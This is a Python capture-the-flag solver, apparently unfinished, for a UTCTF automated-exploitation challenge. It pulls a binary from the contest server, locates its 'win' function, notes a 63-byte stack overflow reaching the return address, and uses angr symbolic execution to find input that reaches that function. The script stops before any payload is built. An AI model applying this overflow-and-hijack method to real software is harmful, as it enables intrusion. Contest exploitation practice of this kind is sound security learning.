
from pwn import *

from time import sleep
import binascii
import fileparsing
import angr

'''
p = remote('pwn.utctf.live', 9997)

binary = b''
p.recvuntil("binary.\n")
p.send("\n")
this_file = p.recvuntil("You have 60 seconds to provide input: \n")
print("file length: " + str(len(this_file)))
file_bytes = fileparsing.parse_a_file(this_file)

print("Okay, got the file. Length = " + str(len(file_bytes)))

f = open('./test_binaries/first_file', 'wb').write(file_bytes)
'''

# Now I'm just going to exploit the first file in an automated manner
# 1. Find the win function
# 2. Figure out what the input must look like to overflow the buffer
# 3. Figure out the input to angr that creates that string for this binary
# 4. Put it all together in a function
pwnable = './test_binaries/first_file'
e = ELF(pwnable)
WIN_ADDR = e.symbols['win']
print(hex(WIN_ADDR)) # Okay, got it
# 
# 2. Figure out what the input must look like to overflow the buffer
#p = gdb.debug(pwnable, '''
#              b *0x400a1b
#              ''')
#p.send('A'*63 + '\n')
# Okay, the last eight bytes overwrite the return address


# generate angr project
print("Generating angr project")
p = angr.Project(pwnable)
print("Generated angr project")

# get a generic representation of the possible program states at the program's entry point
state = p.factory.entry_state()
print("Generated entry state")

# get a SimulationManager to handle the flow of the symbolic execution engine
sm = p.factory.simulation_manager(state, save_unconstrained=True)
print("Generated simulation manager")

sm.explore(find=WIN_ADDR)
print("Finished sm.explore call")
found = sm.found[0]
print(str(sm.found))
#p.interactive()

#print(str(e.symbols))
#p.interactive()

